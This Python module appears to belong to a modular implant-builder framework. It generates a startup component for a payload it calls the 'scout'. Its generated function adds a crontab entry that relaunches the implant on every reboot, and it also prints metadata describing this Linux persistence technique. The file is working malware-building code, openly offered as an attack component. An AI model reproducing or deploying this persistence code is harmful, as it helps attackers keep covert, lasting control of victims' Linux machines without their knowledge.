# WEB + COM
# done
import library.modules.config as config
config.main()
interface = config.interface
if interface == "GUI":
    from flask import jsonify


def main(option):
    if option == 'generate':
        config.import_statements.append('from crontab import CronTab')
        config.import_statements.append('from getpass import getuser')
        config.import_statements.append('from os import path, getcwd')
        config.import_statements.append('from sys import argv')
        config.startup.append('cron_persist_startup()')
        config.functions.append('''
def cron_persist_startup():
    cron = CronTab(user=getuser())
    if path.join(getcwd(),path.abspath(argv[0]))[-3:] == '.py':
        job = cron.new(command='python ' + path.join(getcwd(),path.abspath(argv[0])))
    else:
        job = cron.new(command=path.join(getcwd(),path.abspath(argv[0])))
    job.every_reboot()
    cron.write()
''')
    elif option == 'info':
        if interface == "GUI":
            return {
                "Name": "Cron job persistence startup component",
                "OS": "Linux",
                "Required Modules": "python-crontab (External), getpass, os, sys",
                "Commands": "NIL (Runs at startup)",
                "Description": "Create a cron job of the scout so it runs at startup"
            }
        elif interface == "CUI":
            print('\nName             : Cron job persistence startup component' \
                  '\nOS               : Linux' \
                  '\nRequired Modules : python-crontab (External), getpass, os, sys' \
                  '\nCommands         : NIL (Runs at startup)' \
                  '\nDescription      : Create a cron job of the scout so it runs at startup\n')